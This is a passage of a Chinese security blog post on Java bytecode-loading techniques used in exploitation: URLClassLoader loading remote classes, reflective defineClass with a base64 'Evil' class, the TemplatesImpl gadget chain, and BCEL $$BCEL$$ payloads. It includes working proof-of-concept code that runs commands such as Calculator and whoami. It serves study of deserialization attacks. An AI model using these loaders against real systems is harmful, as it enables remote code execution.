+<h2 id="动态加载字节码"><a href="#动态加载字节码" class="headerlink" title="动态加载字节码"></a>动态加载字节码</h2><h3 id="URLClassLoader加载远程字节码文件"><a href="#URLClassLoader加载远程字节码文件" class="headerlink" title="URLClassLoader加载远程字节码文件"></a>URLClassLoader加载远程字节码文件</h3><p>URLClassLoader实际上是平时默认使用的AppClassLoader的父类，正常情况下Java会根据配置项sun.boot.class.path和java.class.path中列举到的基础路径（这些路径是经过处理后的java.net.URL类）来寻找class文件来加载，而这个基础路径又分为三种情况。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>] URL未以斜杠/结尾，则认为是一个JAR文件，使用JarLoader来寻找类，即为在Jar包中寻找.class文件</span><br><span class="line">[<span class="number">2</span>] URL以斜杠/结尾，且协议名是file，则使用FildLoader来寻找类，即为在本地系统中寻找.class文件</span><br><span class="line">[<span class="number">3</span>] URL以斜杠/结尾，且协议名不是file，则使用最基础的Loader来寻找类</span><br></pre></td></tr></table></figure>
+
+<p>注意，要利用基础的Loader类来寻找这一点必须是非file协议的情况下，JAVA默认提供了对file,ftp,gopher,http,https,jar,mailto和netdoc协议的支持。</p>
+<ul>
+<li>恶意类</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a /System/Applications/Calculator.app&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>利用HTTP服务加载class文件</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLClassloaderTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        URL[] urls = &#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://127.0.0.1:2223/&quot;</span>)&#125;;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> URLClassLoader.newInstance(urls);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">_class</span> <span class="operator">=</span> loader.loadClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        _class.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/04/14/ClassLoader/1708349177993-0c9042fe-3018-4996-86f8-cb585a502fda.png"></p>
+<h3 id="ClassLoader加载字节码"><a href="#ClassLoader加载字节码" class="headerlink" title="ClassLoader加载字节码"></a>ClassLoader加载字节码</h3><p>不管是加载远程class文件还是本地的class或jar文件，Java都经历的是下面这三个方法的调用: ClassLoader#loadClass–&gt;ClassLoader#findClass–&gt;ClassLoader#defineClass。</p>
+<p><img src="/2023/04/14/ClassLoader/1708350437868-213c189a-6915-4a16-ada3-cc1e4af14cbd.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>] loadClass的作用是从已加载的类缓存，父加载器等位置寻找(双亲委派机制)，在前面没有找到的情况下，执行findClass</span><br><span class="line">[<span class="number">2</span>] findClass的作用是根据URL指定的方式来加载类的字节码，可能会在本地系统，jar包或远程http服务器上读取字节码，然后将其交给defineClass</span><br><span class="line">[<span class="number">3</span>] defineClass的作用是处理前面传入的字节码，将其处理成真正的Java类</span><br></pre></td></tr></table></figure>
+
+<p>编译恶意类的class文件，然后用defineClass去加载它。需要注意的是，ClassLoader#defineClass返回的类并不会初始化，只有这个对象显式地调用其构造函数初始化代码才能被执行，所以需要想办法调用返回的类的构造函数来执行命令。在实际场景中，由于defineClass方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是攻击链TemplatesImpl的基石。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefineClassLoaderTest</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAHAoABgAPCgAQABEIABIKABAAEwcAFAcAFQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAWAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwABwAIBwAXDAAYABkBACtvcGVuIC1hIC9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwDAAaABsBAARFdmlsAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAABAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAABwAEAAgADQAJAAsAAAAEAAEADAABAA0AAAACAA4&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">Evil</span> <span class="operator">=</span> (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;Evil&quot;</span>, code, <span class="number">0</span>, code.length);</span><br><span class="line">        Evil.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/04/14/ClassLoader/1708350702793-8e3a7547-5323-4685-b71f-a810642f476b.png"></p>
+<h3 id="TemplatesImpl加载字节码"><a href="#TemplatesImpl加载字节码" class="headerlink" title="TemplatesImpl加载字节码"></a><font style="color:rgb(36, 41, 46);">TemplatesImpl加载字节码</font></h3><p><font style="color:rgb(36, 41, 46);">上文提到了，</font><font style="color:rgb(36, 41, 46);">ClassLoader#defineClass</font><font style="color:rgb(36, 41, 46);">方法只能通过反射调用，在实际环境中很难有利用场景。在</font><font style="color:#080808;">com.sun.org.apache.xalan.internal.xsltc.trax.</font><font style="color:rgb(36, 41, 46);">TemplatesImpl</font><font style="color:rgb(36, 41, 46);">类中的内部类</font><font style="color:rgb(36, 41, 46);">TransletClassLoader</font><font style="color:rgb(36, 41, 46);">重写了</font><font style="color:rgb(36, 41, 46);">defineClass</font><font style="color:rgb(36, 41, 46);">，并且该处没有显式地声明其定义域。在</font><font style="color:rgb(36, 41, 46);">Java</font><font style="color:rgb(36, 41, 46);">中，默认情况下，如果一个方法没有显式声明作用域，则其作用域为</font><font style="color:rgb(36, 41, 46);">default</font><font style="color:rgb(36, 41, 46);">，也就是说这里的</font><font style="color:rgb(36, 41, 46);">defineClass</font><font style="color:rgb(36, 41, 46);">由其父类的</font><font style="color:rgb(36, 41, 46);">protected</font><font style="color:rgb(36, 41, 46);">类型变成了一个允许被外部调用的</font><font style="color:rgb(36, 41, 46);">default</font><font style="color:rgb(36, 41, 46);">类型方法。</font></p>
+<p><img src="/2023/04/14/ClassLoader/1708351381670-6e7fdb31-97f7-4697-b715-458fca5c4961.png"></p>
+<p><img src="/2023/04/14/ClassLoader/1708353018114-0d9f1b98-84f0-4390-b14e-c0a5e4dfd8c2.png"></p>
+<p><font style="color:rgb(36, 41, 46);">但是</font><font style="color:rgb(36, 41, 46);">TransletClassLoader</font><font style="color:rgb(36, 41, 46);">是内部类，只允许</font><font style="color:rgb(36, 41, 46);">TemplatesImpl</font><font style="color:rgb(36, 41, 46);">类中的方法调用，跟进一下发现</font><font style="color:rgb(36, 41, 46);">TemplatesImpl</font><font style="color:rgb(36, 41, 46);">类中只有方法</font><font style="color:rgb(36, 41, 46);">TemplatesImpl#defineTransletClasses</font><font style="color:rgb(36, 41, 46);">用到了</font><font style="color:rgb(36, 41, 46);">TransletClassLoader</font><font style="color:rgb(36, 41, 46);">类，但是</font><font style="color:rgb(36, 41, 46);">TemplatesImpl#defineTransletClasses</font><font style="color:rgb(36, 41, 46);">方法是</font><font style="color:rgb(36, 41, 46);">private</font><font style="color:rgb(36, 41, 46);">类型。</font></p>
+<p><img src="/2023/04/14/ClassLoader/1708361897796-5fcf8776-46a6-4869-a3dc-57b634525cfc.png"></p>
+<p><img src="/2023/04/14/ClassLoader/1708362057937-dd53fa0c-69ad-4e28-820e-7c0f9bfcca9d.png"></p>
+<p>继续跟一下<font style="color:rgb(36, 41, 46);">TemplatesImpl#defineTransletClasses</font><font style="color:rgb(36, 41, 46);">方法，一共有三个方法调用了它。</font></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">synchronized</span> Class[] getTransletClasses() &#123;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">getTransletIndex</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span> &#123;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/04/14/ClassLoader/1708364858623-13d3a976-4631-44dc-801d-3609f3193ca0.png"></p>
+<p>接着上面的三个利用点进一步分析，getTransletIndex方法可以直接作为一个触发的点，但是测试后并没有成功触发，而getTransletClasses方法在TemplatesImpl类中已经没有继续被调用了，因此只剩下getTransletInstance方法，再跟一下发现TemplatesImpl#newTransformer方法调用了它，这里也可以作为一个触发点，继续跟下去发现TemplatesImpl#getOutputProperties方法调用了TemplatesImpl#newTransformer方法，因此这里也可以作为一个触发点。</p>
+<p><img src="/2023/04/14/ClassLoader/1708366322999-da5160fc-e98e-40c7-a37f-2bd77a58000b.png"></p>
+<p><img src="/2023/04/14/ClassLoader/1708366425326-5498f1e8-94af-4600-91ec-9c68249e72c4.png"></p>
+<p>由上可以得到两条调用链：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>] TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()-&gt;TemplatesImpl#defineTransletClasses() -&gt; TransletClassLoader#defineClass()  </span><br><span class="line"></span><br><span class="line">[<span class="number">2</span>] TemplatesImpl#getOutputProperties() -&gt;TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()-&gt;TemplatesImpl#defineTransletClasses() -&gt; TransletClassLoader#defineClass() </span><br></pre></td></tr></table></figure>
+
+<p>那么为什么getTransletIndex方法无法触发呢？上文说到，在defineClass被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造函数，初始化代码才能被执行。而且，即使将初始化代码放在类的static块中，在defineClass时也无法被直接调用到。所以，如果要使用defineClass在目标机器上执行任意代码，需要想办法调用构造函数。对于getTransletIndex方法，虽然有执行到defineClass，但后面并没有对这个类对象进行实例化，也就是说并没有调用其构造函数，因此无法触发漏洞。反观TemplatesImpl#newTransformer方法，在调用完TemplatesImpl#defineTransletClasses方法后又调用了newInstance构造函数，所以能够完成后续操作，触发恶意代码。</p>
+<p><img src="/2023/04/14/ClassLoader/1708366907124-0836d695-de67-40f8-9bee-3f39280366ff.png"></p>
+<p><img src="/2023/04/14/ClassLoader/1708366858398-3af3671c-0818-4eb3-a47c-475cae281656.png"></p>
+<p>在构造利用链的过程中，还需注意以下几点：</p>
+<ol>
+<li>TemplatesImpl中对加载的字节码对应的类必须是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet的子类</li>
+</ol>
+<p><img src="/2023/04/14/ClassLoader/1708368360450-078310aa-d7a1-454e-9ef0-64a13270357f.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilTest</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilTest</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>TemplatesImpl中_name属性值必须不为null</li>
+</ol>
+<p><img src="/2023/04/14/ClassLoader/1708368498181-e4900389-7d91-41d9-bd27-58e13afc4b89.png"></p>
+<ol start="3">
+<li><font style="color:rgb(51, 51, 51);">TemplatesImpl</font><font style="color:rgb(51, 51, 51);">中</font><font style="color:rgb(51, 51, 51);">_tfactory</font><font style="color:rgb(51, 51, 51);">属性值必须是</font><font style="color:rgb(51, 51, 51);">TransformerFactoryImpl</font><font style="color:rgb(51, 51, 51);">实例</font></li>
+</ol>
+<p><img src="/2023/04/14/ClassLoader/1708368655234-f91fbfa9-fab6-4a2f-97e3-17c7fcec11ce.png"></p>
+<p>TemplatesImpl完整利用链如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplClassLoaderTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(org.example.classloader.EvilTest.class.getName());</span><br><span class="line">        <span class="type">byte</span>[] code = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;EvilTest&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/04/14/ClassLoader/1708368126498-07118fd7-2368-4cb5-a46f-f9dfc17c4dc2.png"></p>
+<h3 id="BCEL-ClassLoader"><a href="#BCEL-ClassLoader" class="headerlink" title="BCEL ClassLoader"></a>BCEL ClassLoader</h3><p><a target="_blank" rel="noopener" href="https://commons.apache.org/proper/commons-bcel/">BCEL</a><font style="color:rgb(51, 51, 51);">是一个用于分析、创建和操纵</font><font style="color:rgb(51, 51, 51);">Java</font><font style="color:rgb(51, 51, 51);">类文件的工具库，</font><font style="color:rgb(51, 51, 51);">Oracle JDK</font><font style="color:rgb(51, 51, 51);">引用了</font><font style="color:rgb(51, 51, 51);">BCEL</font><font style="color:rgb(51, 51, 51);">库，不过将原包名</font><font style="color:rgb(51, 51, 51);">org.apache.bcel.util.ClassLoader</font><font style="color:rgb(51, 51, 51);">修改为</font><font style="color:rgb(51, 51, 51);">com.sun.org.apache.bcel.internal.util.ClassLoader</font><font style="color:rgb(51, 51, 51);">，</font><font style="color:rgb(51, 51, 51);">BCEL</font><font style="color:rgb(51, 51, 51);">的类加载器在解析类名时会对</font><font style="color:rgb(51, 51, 51);">ClassName</font><font style="color:rgb(51, 51, 51);">中有</font><font style="color:rgb(51, 51, 51);">$$BCEL$$</font><font style="color:rgb(51, 51, 51);">标识的类做特殊处理，该特性经常被用于编写各类攻击</font><font style="color:rgb(51, 51, 51);">Payload</font><font style="color:rgb(51, 51, 51);">。</font></p>
+<h4 id="BCEL兼容性问题"><a href="#BCEL兼容性问题" class="headerlink" title="BCEL兼容性问题"></a><font style="color:rgb(51, 51, 51);">BCEL兼容性问题</font></h4><p>Oracle自带的BCEL是修改了原始的包名，因此也有兼容性问题，已知支持该特性的JDK版本为：JDK1.5-1.7、JDK8-JDK8u241、JDK9，BCEL Classloader在JDK8u251之前是在rt.jar里面。<br>    同时在Tomcat中也会存在相关的依赖：</p>
+<ol>
+<li>Tomcat7：org.apache.tomcat.dbcp.dbcp.BasicDataSource</li>
+<li>Tomcat8及其以后：org.apache.tomcat.dbcp.dbcp2.BasicDataSource</li>
+</ol>
+<p><font style="color:rgb(51, 51, 51);">B</font>CEL这个特性仅适用于BCEL 6.0以下，因为从6.0开始org.apache.bcel.classfile.ConstantUtf8#setBytes就已经过时了，因此利用时需要注意JDK版本是否JDK8u251之后的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bytes the raw bytes of this Utf-8</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@deprecated</span> (since 6.0)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@java</span>.lang.Deprecated</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setBytes</span><span class="params">( <span class="keyword">final</span> String bytes )</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="BCEL攻击原理"><a href="#BCEL攻击原理" class="headerlink" title="BCEL攻击原理"></a>BCEL攻击原理</h4><p>BCEL包中有一个类com.sun.org.apache.bcel.internal.util.ClassLoader重写了Java内置的ClassLoader#loadClass方法，在重写的方法中，会判断类名是否是$$BCEL$$开头，如果是的话，接着调用createClass方法拿到一个JavaClass对象，最终通过defineClass加载字节码还原类。</p>
+<p><img src="/2023/04/14/ClassLoader/1708587531918-1e4a2c24-9764-4ef4-bc57-733eb017d7a1.png"></p>
+<p>跟进com.sun.org.apache.bcel.internal.util.ClassLoader#createClass方法，可以看到其获取JavaClass对象时，会进行一个decode操作。</p>
+<p><img src="/2023/04/14/ClassLoader/1708588090921-df8526bb-38e5-47be-8809-edec2655a873.png"></p>
+<p>对于encode操作，直接调用<font style="color:#080808;background-color:#ffffff;">com.sun.org.apache.bcel.internal.classfile.Utility#encode</font><font style="color:#080808;background-color:#ffffff;">方法来加密恶意类即可。</font></p>
+<p><img src="/2023/04/14/ClassLoader/1708588314594-7b857808-c8b8-4e8c-a1cf-ca52e61814cc.png"></p>
+<h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCELClassLoaderTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取class</span></span><br><span class="line">            <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(Evil.class);</span><br><span class="line">            System.out.println(Arrays.toString(javaClass.getBytes()));</span><br><span class="line">            <span class="comment">// 编码为bcel格式</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(javaClass.getBytes(), <span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// 加载类: 调用 exec 方法执行命令</span></span><br><span class="line">            <span class="type">Process</span> <span class="variable">command</span> <span class="operator">=</span> (Process) <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span> + code).getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(<span class="literal">null</span>, <span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">            <span class="comment">// 读取数据</span></span><br><span class="line">            System.out.println(getCommandResult(command));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取命令执行的结果</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getCommandResult</span><span class="params">(Process process)</span> &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> len;</span><br><span class="line">        <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> ((len = inputStream.read(bytes)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                res = res.concat(<span class="keyword">new</span> <span class="title class_">String</span>(bytes, <span class="number">0</span>, len));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/04/14/ClassLoader/1708590393401-629079d3-cdf7-4b70-b488-36f6f7eb707a.png"></p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
